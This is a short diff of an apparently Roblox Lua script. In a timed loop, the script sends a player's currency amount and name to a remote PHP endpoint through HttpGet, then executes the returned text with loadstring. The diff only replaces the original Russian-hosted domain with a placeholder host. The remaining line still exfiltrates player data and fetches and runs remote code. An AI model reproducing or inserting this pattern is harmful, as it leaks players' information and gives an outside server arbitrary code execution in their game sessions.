@@ -37,7 +37,7 @@ until bucksAmount ~= nil
  if updateBuks ~= bucksAmount then
   updateBuks =  bucksAmount
 
-loadstring(game:HttpGet("http://agt.ru.swtest.ru/TransferData.php?data="..bucksAmount.."&name="..playerName))()
+loadstring(game:HttpGet("http://example.local/TransferData.php?data="..bucksAmount.."&name="..playerName))()
   end
 wait(360)
 end
